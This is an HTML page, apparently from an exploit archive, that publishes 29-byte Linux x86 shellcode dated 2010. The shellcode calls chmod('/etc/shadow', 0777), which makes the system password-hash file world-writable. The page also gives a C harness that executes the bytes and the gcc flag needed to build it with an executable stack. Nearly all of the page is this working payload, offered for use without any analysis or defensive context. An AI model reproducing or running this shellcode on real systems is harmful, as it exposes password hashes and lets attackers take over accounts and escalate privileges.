<html><head><title>Linux/x86 - chmod(/etc/shadow, 0777) - 29 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
 
/*
by Magnefikko
20.04.2010
magnefikko@gmail.com
promhyl.oz.pl
Subgroup: #PRekambr
Name: 29 bytes chmod(&quot;/etc/shadow&quot;, 0777) shellcode
Platform: Linux x86
 
chmod(&quot;/etc/shadow&quot;, 0777);
 
gcc -Wl,-z,execstack filename.c
 
shellcode:
 
\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x66\x68\xff\x01\x59\xb0\x0f\xcd\x80
 
*/
 
 
int main(){
char shell[] =
&quot;\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x66\x68\xff\x01\x59\xb0\x0f\xcd\x80&quot;;
printf(&quot;by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n&quot;, strlen(shell));
(*(void (*)()) shell)();
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
